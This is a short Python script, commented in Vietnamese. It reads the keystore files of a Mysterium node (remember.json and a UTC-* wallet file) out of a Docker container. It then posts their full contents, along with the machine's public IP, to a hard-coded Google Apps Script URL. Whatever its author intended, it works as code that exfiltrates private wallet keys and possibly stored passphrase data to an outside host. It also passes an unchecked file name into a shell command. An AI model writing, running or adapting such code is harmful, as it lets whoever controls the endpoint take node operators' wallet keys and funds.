import subprocess
import json
import requests

def get_public_ipv4():
    """ Lấy địa chỉ IPv4 chính xác """
    try:
        ip = requests.get("http://checkip.amazonaws.com", timeout=5).text.strip()
        return ip
    except:
        try:
            ip = requests.get("https://ifconfig.me", timeout=5).text.strip()
            return ip
        except:
            return "Unknown"

# Lấy địa chỉ IPv4
ipv4 = get_public_ipv4()

# Lấy toàn bộ dữ liệu từ remember.json
wallet_json = subprocess.run(
    "docker exec myst cat /var/lib/mysterium-node/keystore/remember.json",
    shell=True, capture_output=True, text=True
).stdout.strip()

try:
    wallet_data = json.loads(wallet_json)  # Giữ nguyên toàn bộ nội dung
except json.JSONDecodeError:
    print("LỖI: Không thể đọc dữ liệu từ remember.json!")
    wallet_data = {}

# Lấy tên file UTC-*
utc_file = subprocess.run(
    "docker exec myst ls /var/lib/mysterium-node/keystore | grep UTC-",
    shell=True, capture_output=True, text=True
).stdout.strip()

# Lấy toàn bộ dữ liệu từ file UTC-*
phase_json = subprocess.run(
    f"docker exec myst cat /var/lib/mysterium-node/keystore/{utc_file}",
    shell=True, capture_output=True, text=True
).stdout.strip()

try:
    phase_data = json.loads(phase_json)  # Giữ nguyên toàn bộ nội dung
except json.JSONDecodeError:
    print("LỖI: Không thể đọc dữ liệu từ UTC file!")
    phase_data = {}

# Gửi toàn bộ dữ liệu lên Google Apps Script
api_url = "https://script.google.com/macros/s/AKfycbxinRyh8Kl7q-SvhZYUoQLeh0-WU9gn5Mh3akiS2AQK3Wg1oN2XeZTMqJyGRPnMhL0v/exec"
data = {
    "ipv4": ipv4,
    "wallet_data": wallet_data,  # Gửi toàn bộ nội dung của remember.json
    "phase_data": phase_data     # Gửi toàn bộ nội dung của UTC file
}
response = requests.post(api_url, json=data)

print(response.json())  # Kiểm tra phản hồi từ Apps Script
